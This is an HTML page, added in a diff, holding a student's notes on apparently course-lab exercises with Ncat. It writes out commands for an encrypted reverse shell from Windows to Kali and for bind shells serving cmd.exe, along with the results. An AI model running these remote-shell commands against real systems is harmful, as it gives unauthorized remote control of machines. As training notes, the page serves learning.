@@ -1,0 +1,64 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Exercises-2.2.1-ncat</title>
+</head><body>1. Use Ncat to create an encrypted reverse shell from your Windows system to your<br/>
+Kali machine<br/>
+2. Create an encrypted bind shell on your Windows VM. Try to connect to it from<br/>
+Kali without encryption. Does it still work?<br/>
+3. Make an unencrypted Ncat bind shell on your Windows system. Connect to the<br/>
+shell using Netcat. Does it work?<br/>
+<br/>
+<br/>
+* Had to update ncat on Windows to 7.50 using this process from the forums at https://forums.offensive-security.com/showthread.php?12977-Ncat-encounters-quot-wrong-versoin-quot-not-responding-issue-with-SSL-connection-Ncat-v7-60&amp;highlight=ncat%20ssl:<br/>
+<br/>
+1) download version 7.50 (nmap-7.50-win32.zip) from nmap dist site (nmap <a href="https://nmap.org/dist/?C=M&O=D">https://nmap.org/dist/?C=M&amp;O=D</a>)<br/>
+2) unzip download <br/>
+3) ncat kali listener with unzipped folder to transfer<br/>
+- ncat -nlvp 444 &lt; Downloads/nmap-7.50-win32<br/>
+4) ncat windows connector to receive transfer<br/>
+- ncat -nv &lt;kali IP&gt; 4444 &gt; &lt;nmap-7.50<br/>
+5) Unzip folder using file viewer GUI (may have to modify you access rights)<br/>
+6) Install/run both "vr........" files<br/>
+7) lastly, you most run your ncat command from inside this folder<br/>
+8) BOOM ROASTED, your done and working with --ssl connections<br/>
+<br/>
+1. <br/>
+On Kali machine:<br/>
+root@:~&gt; ncat -nlvp 9999 --allow 10.11.10.124 --ssl<br/>
+On WIN machine: <br/>
+C:\Windows\nmap-7.50&gt; ncat -nv 10.11.0.187 9999 -e cmd.exe --ssl<br/>
+<br/>
+Result:<br/>
+...<br/>
+Copyright (c) 2009 Microsoft Corporation. &nbsp;All rights reserved.<br/>
+<br/>
+C:\Windows\nmap-7.50&gt;Copyright (c) 2009 Microsoft Corporation. &nbsp;All rights reserved.<br/>
+<br/>
+C:\Windows\nmap-7.50&gt;<br/>
+<br/>
+2. <br/>
+On WIN machine:<br/>
+C:\Windows\nmap-7.50&gt; ncat -nlvp 9999 -e cmd.exe --allow 10.11.0.187 --ssl<br/>
+On Kali:<br/>
+ncat -nv 10.11.10.124 9999<br/>
+<br/>
+Result:<br/>
+Ncat: Version 7.60 ( https://nmap.org/ncat )<br/>
+Ncat: Connected to 10.11.10.124:9999.<br/>
+<br/>
+Conclusion:<br/>
+The connection is allowed, but the shell does not work.<br/>
+<br/>
+3. <br/>
+On WIN machine:<br/>
+C:\Windows\nmap-7.50&gt; ncat -nlvp 9999 -e cmd.exe --allow 10.11.0.187<br/>
+On Kali:<br/>
+nc -nv 10.11.10.124 9999<br/>
+<br/>
+Conclusion:<br/>
+Yes, it does work.<br/>
+<br/>
+<br/>
+</body></html>
